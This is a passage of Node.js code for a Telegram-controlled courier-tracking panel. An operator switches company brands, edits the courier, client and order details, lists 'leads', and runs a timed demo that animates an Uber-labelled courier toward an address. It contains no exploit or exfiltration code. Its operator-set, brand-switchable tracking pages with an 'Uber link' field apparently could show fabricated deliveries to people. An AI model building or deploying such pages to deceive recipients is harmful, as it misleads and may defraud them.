      case 'show_state':
        sendSnapshot(chatId); return;

      case 'toggle_menu': {
        const keys = ['map','eta','timeline','courierCard','clientCard','orderCard','deliveryCode','instructions','uberLink','callCourier','rep'];
        const kb = { inline_keyboard: keys.map((k) => [
          { text: `${state.ui[k] ? '🟢' : '⚫'} ${k}`, callback_data: `toggle:${k}` },
        ]) };
        bot.sendMessage(chatId, 'Tap to show/hide each section:', { reply_markup: kb });
        return;
      }
      case 'refresh_menu': {
        const kb = { inline_keyboard: loadCompanies().map((c) => [
          { text: `🔄 ${c.id} - ${c.name}`, callback_data: `refresh:${c.id}` },
        ]) };
        bot.sendMessage(chatId, 'Pick a brand to re-pull live:', { reply_markup: kb });
        return;
      }

      // ---- conversation confirm / cancel ----
      case 'confirm_value':
        applyConfirmed(chatId); return;
      case 'reenter':
        if (convos[chatId]) askField(chatId); return;
      case 'cancel_convo':
        delete convos[chatId];
        bot.sendMessage(chatId, '❌ Cancelled. Back to menu.');
        sendMenu(chatId); return;
    }

    // ---- prefixed callbacks ----
    if (data.startsWith('edit:')) {
      const wKey = data.split(':')[1];
      startWizard(chatId, wKey);
      return;
    }
    if (data.startsWith('switch:')) {
      const id = data.split(':')[1];
      const comp = loadCompanies().find((c) => c.id === id);
      if (comp) { state.company = comp; broadcastUpdate(); bot.sendMessage(chatId, `Brand: *${comp.name}*`, { parse_mode: 'Markdown' }); }
      return;
    }
    if (data.startsWith('refresh:')) {
      const id = data.split(':')[1];
      bot.sendMessage(chatId, `Pulling ${id}...`);
      fetchBrand(id).then((fresh) => {
        const list = loadCompanies();
        const idx = list.findIndex((c) => c.id === id);
        if (idx >= 0) list[idx] = fresh; else list.push(fresh);
        saveCompanies(list);
        if (state.company && state.company.id === id) state.company = fresh;
        broadcastUpdate();
        bot.sendMessage(chatId, `✅ ${id} refreshed: ${fresh.name} (${fresh.primary})`);
      }).catch((e) => bot.sendMessage(chatId, `Failed: ${e.message}`));
      return;
    }
    if (data.startsWith('toggle:')) {
      const key = data.split(':')[1];
      if (state.ui[key] !== undefined) {
        state.ui[key] = !state.ui[key]; broadcastUpdate();
        bot.sendMessage(chatId, `${key} ${state.ui[key] ? '🟢 ON' : '⚫ OFF'}`);
      }
      return;
    }
  });
}

function sendSnapshot(chatId) {
  const s = snapshot();
  const lines = [
    `*Company:* ${s.company.name} (${s.company.id}) [${s.company.theme}]`,
    `*Client:* ${s.client.name} - ${s.client.address}, ${s.client.city} - ${s.client.phone}`,
    `*Courier:* ${s.courier.name} (${s.courier.vehicle}) ETA ${s.courier.eta} ★${s.courier.rating} ${s.courier.phone}`,
    `*Order:* ${s.order.items} (${s.order.note})`,
    `*Status:* ${s.trip.status}  (step ${s.trip.flowIndex + 1}/${STATUS_FLOW.length})`,
    `*Message:* ${s.trip.statusMessage}`,
    `*Delivery code:* ${s.trip.deliveryCode}`,
    `*Tracking:* ${s.client.trackingId}`,
    `*Uber link:* ${s.trip.uberLink}`,
    `*Courier pos:* ${s.trip.courierPos.lat.toFixed(4)}, ${s.trip.courierPos.lng.toFixed(4)}`,
    `*Destination:* ${s.trip.destinationPos.lat.toFixed(4)}, ${s.trip.destinationPos.lng.toFixed(4)}`,
    `*Leads:* ${(s.leads || []).length}`,
  ];
  if (s.leads && s.leads.length) {
    s.leads.forEach((l, i) => {
      lines.push(`  ${i+1}. ${l.fullName}${l.location ? ' — ' + (l.locationDisplay || l.location) : ''}${l.branches && l.branches.length ? ` (${l.branches.length} branches)` : ''}`);
    });
  }
  bot.sendMessage(chatId, lines.join('\n'), { parse_mode: 'Markdown' });
}

// ---------- status flow helpers ----------
function applyFlowStatus() {
  const f = STATUS_FLOW[state.trip.flowIndex] || STATUS_FLOW[STATUS_FLOW.length - 1];
  state.trip.status = f.status;
  state.trip.statusMessage = f.message;
  if (f.status === 'En route' && !state.trip.route) {
    state.trip.route = buildRoute(state.trip.courierPos, state.trip.destinationPos);
    state.trip.stepIndex = 0;
    state.trip.simulating = true;
  }
  if (f.status === 'Arrived') {
    state.trip.simulating = false;
    state.trip.courierPos = { ...state.trip.destinationPos };
  }
  recalcEta();
}
function advanceStatus(steps) {
  state.trip.flowIndex = Math.min(STATUS_FLOW.length - 1, state.trip.flowIndex + steps);
  applyFlowStatus();
}

// ---------- company field editing helpers ----------
function applyCompanyField(fields) {
  if (!state.company) return;
  const list = loadCompanies();
  const idx = list.findIndex((c) => c.id === state.company.id);
  if (idx < 0) return;
  Object.assign(list[idx], fields);
  saveCompanies(list);
  state.company = list[idx];
}

// ---------------- Demo mode ----------------
const demoTimers = [];
function clearDemoTimers() {
  demoTimers.forEach(clearTimeout);
  demoTimers.length = 0;
}
function demoStep(ms, fn) {
  const t = setTimeout(fn, ms);
  demoTimers.push(t);
  return t;
}
function setFlow(n) {
  state.trip.flowIndex = Math.max(0, Math.min(STATUS_FLOW.length - 1, n));
  applyFlowStatus();
  broadcastUpdate();
}
function demoAlert(text) {
  io.emit('alert', { text, ts: Date.now() });
}

function runDemo(chatId) {
  if (state.trip.demoRunning) {
    bot.sendMessage(chatId, 'Demo already running. Use /stopdemo to abort.');
    return;
  }
  clearDemoTimers();
  stopSimulation();

  // fresh demo order
  const keep = state.company;
  const fresh = defaultState();
  fresh.company = keep;
  fresh.client = {
    name: 'Jordan Rivera',
    trackingId: 'UB-' + Math.floor(1000 + Math.random() * 9000),
    address: '480 Howard Street, Floor 6',
    city: 'San Francisco, CA',
    phone: '+1 415 555 0177',
  };
  fresh.courier = {
    name: 'Aisha (Uber Courier)',
    vehicle: 'Electric Scooter',
    eta: '—',
    rating: '4.95',
    phone: '+1 415 555 0188',
  };
  fresh.order = { items: '1x Sealed Document Pouch', note: 'Signature required on delivery' };
  // courier starts a bit away; destination near the client
  fresh.trip.courierPos = { lat: 37.7819, lng: -122.4053 };
  fresh.trip.destinationPos = { lat: 37.7869, lng: -122.4076 };
  fresh.trip.flowIndex = 0;
  fresh.trip.demoRunning = true;
  Object.assign(state, fresh);
  applyFlowStatus();
  broadcastUpdate();
  bot.sendMessage(chatId, '🎬 *Demo mode started* — watching the full delivery flow from initiation to delivery. Open http://localhost:3000 and keep this chat handy. Use /stopdemo to abort.', { parse_mode: 'Markdown' });

  // t0 — already Order received
  demoAlert('New order received — your tracking page is now live.');

  // +4s: courier assigned
  demoStep(4000, () => {
    setFlow(1);
    demoAlert('A courier has been assigned to your delivery.');
  });

  // +9s: picking up (carrier pickup)
  demoStep(9000, () => {
    setFlow(2);
    demoAlert('Your courier is picking up your package from the carrier hub.');
  });

  // +15s: en route — build a road-following route & start moving
  demoStep(15000, async () => {
    setFlow(3);
    state.trip.route = await buildRoadRoute(state.trip.courierPos, state.trip.destinationPos);
    state.trip.stepIndex = 0;
    state.trip.simulating = true;
    state.trip.etaAuto = true;
    recalcEta();
    broadcastUpdate();
    demoAlert('Package picked up — your courier is en route to you.');
  });

  // +30s: arriving (courier near)
  demoStep(30000, () => {
    setFlow(4);
    demoAlert('Your courier is almost there. Please be ready.');
  });

  // +36s: arrived
  demoStep(36000, () => {
    setFlow(5);
    state.trip.courierPos = { ...state.trip.destinationPos };
    state.trip.simulating = false;
    broadcastUpdate();
    demoAlert('Your courier has arrived. Share your delivery code.');
  });

  // +43s: delivered
  demoStep(43000, () => {
    setFlow(6);
    demoAlert('Package delivered. Thank you for using our service!');
  });

  // +47s: wrap up
  demoStep(47000, () => {
    state.trip.demoRunning = false;
    broadcastUpdate();
    bot.sendMessage(chatId, '✅ *Demo complete.* The full flow ran from order initiation → carrier pickup → en route → arrival → delivery.', { parse_mode: 'Markdown' });
  });
}

function stopDemo(chatId) {
  clearDemoTimers();
  state.trip.demoRunning = false;
  state.trip.simulating = false;
  broadcastUpdate();
  bot.sendMessage(chatId, '⏹ Demo stopped. Panel holds its current state — use /neworder or /demo to continue.');
}

function stopSimulation() {
  state.trip.simulating = false;
  state.trip.route = null;
}

// ---------------- Live simulation engine ----------------
// Road-following routing via OSRM (free, no API key)
async function buildRoadRoute(start, end) {
  const url = `https://routing.openstreetmap.de/routed-car/route/v1/driving/${start.lng},${start.lat};${end.lng},${end.lat}?overview=full&geometries=geojson`;
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 10000);
    const res = await fetch(url, { signal: ctrl.signal });
    clearTimeout(t);
    if (!res.ok) throw new Error('OSRM HTTP ' + res.status);
    const data = await res.json();
    if (!data.routes || data.routes.length === 0) throw new Error('no route');
    const coords = data.routes[0].geometry.coordinates; // [[lng,lat],...]
    const route = coords.map((c) => ({ lat: c[1], lng: c[0] }));
    return route;
  } catch (e) {
    // fall back to straight line if OSRM fails
    return buildRouteN(start, end, 24);
  }
}

function buildRoute(start, end) {
  return buildRouteN(start, end, 24);
}
function buildRouteN(start, end, steps) {
  const route = [];
  for (let i = 0; i <= steps; i++) {
    const t = i / steps;
    route.push({
      lat: start.lat + (end.lat - start.lat) * t,
      lng: start.lng + (end.lng - start.lng) * t,
    });
  }
  return route;
}

function advanceCourier() {
  if (!state.trip.route) return;
  if (state.trip.stepIndex < state.trip.route.length - 1) {
    state.trip.stepIndex++;
    state.trip.courierPos = state.trip.route[state.trip.stepIndex];
    recalcEta();
    // During demo mode the timeline is driven by runDemo(), so only move the marker.
    if (state.trip.demoRunning) return;
    const remaining = state.trip.route.length - 1 - state.trip.stepIndex;
    // auto-advance the status timeline as the courier approaches
    if (remaining <= 2 && state.trip.status === 'En route') {
      state.trip.flowIndex = 4; // Arriving
      applyFlowStatus();
    }
    if (state.trip.stepIndex >= state.trip.route.length - 1) {
      state.trip.flowIndex = 5; // Arrived
      applyFlowStatus();
      state.trip.simulating = false;
    }
  }
}

setInterval(() => {
  if (state.trip.simulating && state.trip.route) {
    advanceCourier();
    broadcastUpdate();
  }
}, 2000);

// ---------------- Boot ----------------
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Courier panel running on port ${PORT}`);
});
